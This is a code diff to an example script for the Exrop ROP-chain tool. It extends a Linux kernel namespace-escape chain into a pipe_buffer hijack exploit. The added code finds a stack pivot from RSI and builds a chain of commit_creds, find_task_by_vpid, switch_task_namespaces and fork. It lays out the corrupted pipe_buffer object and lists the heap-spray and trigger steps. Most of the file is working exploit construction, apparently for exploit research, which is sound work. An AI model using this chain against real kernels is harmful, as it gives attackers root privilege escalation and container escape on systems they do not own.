@@ -1,24 +1,47 @@
-"""Example: Linux kernel namespace escape chain.
+"""Example: Linux kernel namespace escape via pipe_buffer hijack.
 
-Builds a privilege escalation ROP chain:
-  commit_creds(init_cred)
-  find_task_by_vpid(1)
-  switch_task_namespaces(result, init_nsproxy)
-  fork()
-  msleep(1000000000)
+Simulates the popular pipe_buffer exploit technique:
 
-Adapted from the angrop linux_escape_chain example. Key difference:
-Exrop's func_call() accepts register names as arguments natively, so
-`func_call(f, ('rax', val))` replaces angrop's 3-step pattern of
-move_regs + set_regs(preserve_regs) + func_call(preserve_regs).
+  1. Corrupt pipe_buffer.ops to point to a fake pipe_buf_operations vtable
+  2. When pipe_buf_release() calls ops->release(pipe, buf), RSI = buf
+  3. Pivot RSP from RSI (the controlled pipe_buffer), preserving the
+     ops pointer at buf+0x10 since the kernel loads it before our gadget
+  4. Execute ROP chain embedded in the pipe_buffer object:
+       commit_creds(init_cred)
+       find_task_by_vpid(1)
+       switch_task_namespaces(result, init_nsproxy)
+       fork()
+       msleep(1000000000)
+
+pipe_buf_release() decompiles to:
+
+    static inline void pipe_buf_release(struct pipe_inode_info *pipe,
+                                        struct pipe_buffer *buf)
+    {
+        const struct pipe_buf_operations *ops = buf->ops;  // load [rsi+0x10]
+        buf->ops = NULL;
+        ops->release(pipe, buf);  // call [[rsi+0x10]+0x08]
+    }
+
+struct pipe_buffer layout (x86-64):
+    +0x00  struct page *page
+    +0x08  unsigned int offset
+    +0x0c  unsigned int len
+    +0x10  const struct pipe_buf_operations *ops   <-- hijacked
+    +0x18  unsigned int flags
+    +0x20  unsigned long private
 
 Usage:
     PYTHONPATH=. python3 examples/linux_escape_chain.py /path/to/vmlinux
 """
 
+import struct
 import sys
 from elftools.elf.elffile import ELFFile
 from Exrop import Exrop
+
+# pipe_buffer field offsets (x86-64)
+PIPE_BUF_OPS_OFF = 0x10
 
 
 def resolve_symbols(vmlinux_path, names):
@@ -74,7 +97,37 @@ e = Exrop(VMLINUX)
 e.find_gadgets(cache=True, kernel_mode=True)
 e.clean_only = True
 
-# Build the chain
+# ============================================================
+# Step 1: Find pivot gadget from RSI (pipe_buffer pointer)
+# ============================================================
+# The kernel dispatches ops->release(pipe, buf) where RSI = buf.
+# We need a gadget that sets RSP from RSI so our ROP chain
+# (embedded in the pipe_buffer) executes.
+#
+# The ops pointer at buf+0x10 is loaded by the kernel BEFORE
+# calling our gadget, but the JOP search doesn't know that —
+# pass it in used_dispatch so JOP chains won't overwrite it.
+print("=== Finding pivot from RSI (pipe_buffer) ===\n")
+
+used_dispatch = {PIPE_BUF_OPS_OFF: 0}  # reserve buf->ops slot
+pivots = e.stack_pivot_reg('rsi', used_dispatch=used_dispatch)
+
+# Filter out indirect pivots — they require an extra pointer dereference
+# (rsp = *[reg+off]) which is impractical for heap-sprayed objects since
+# we don't know the absolute address to place there.
+pivots = [p for p in pivots if p.pivot_type not in ('indirect', 'jop_indirect')]
+
+if not pivots:
+    print("No pivot found from RSI!")
+    sys.exit(1)
+
+pivot = pivots[0]
+print("Best pivot:")
+pivot.dump()
+
+# ============================================================
+# Step 2: Build the ROP chain (post-pivot)
+# ============================================================
 print("\n=== Building escape chain ===\n")
 
 # 1. commit_creds(init_cred)
@@ -108,6 +161,45 @@ chain5 = e.func_call(msleep, (1000000000,))
 chain.merge_ropchain(chain5)
 chain5.dump()
 
-print("\n=== Full chain ===\n")
+print("\n=== Full ROP chain ===\n")
 chain.dump()
-print("\nChain length: {} bytes".format(len(chain.payload_str())))
+
+# ============================================================
+# Step 3: Build the pipe_buffer object layout
+# ============================================================
+print("\n=== pipe_buffer object layout ===\n")
+
+PIPE_BUF_SIZE = 0x28  # sizeof(struct pipe_buffer)
+OBJ_SIZE = max(0x100, PIPE_BUF_SIZE + len(chain.payload_str()) + 0x40)
+
+payload = pivot.build_payload(chain, obj_size=OBJ_SIZE)
+print(payload['description'])
+print("Chain offset: 0x{:x}".format(payload['chain_offset']))
+print("Total object size: 0x{:x} bytes".format(len(payload['obj_layout'])))
+
+# Hexdump the object layout
+obj = payload['obj_layout']
+print("\nObject hexdump:")
+for off in range(0, len(obj), 8):
+    qword = struct.unpack_from('<Q', obj, off)[0]
+    marker = ""
+    if off == PIPE_BUF_OPS_OFF:
+        marker = "  <-- buf->ops (reserved)"
+    elif off == payload['chain_offset']:
+        marker = "  <-- ROP chain start"
+    if 'dispatch_entries' in payload:
+        for d_off, d_addr in payload['dispatch_entries']:
+            if off == d_off:
+                marker = "  <-- JOP dispatch"
+    if qword or marker:
+        print("  +0x{:04x}: 0x{:016x}{}".format(off, qword, marker))
+
+# Show how to set up the fake ops vtable
+# ops->release is at offset 0x08 in pipe_buf_operations
+print("\nSetup:")
+print("  1. Spray pipe_buffer objects")
+print("  2. Set buf->ops (+0x{:x}) -> fake_ops_table".format(PIPE_BUF_OPS_OFF))
+print("  3. Set fake_ops->release (+0x08) -> 0x{:x}  (pivot gadget)".format(
+    payload['func_ptr']))
+print("  4. Embed ROP chain at buf+0x{:x}".format(payload['chain_offset']))
+print("  5. Close pipe fd to trigger pipe_buf_release()")
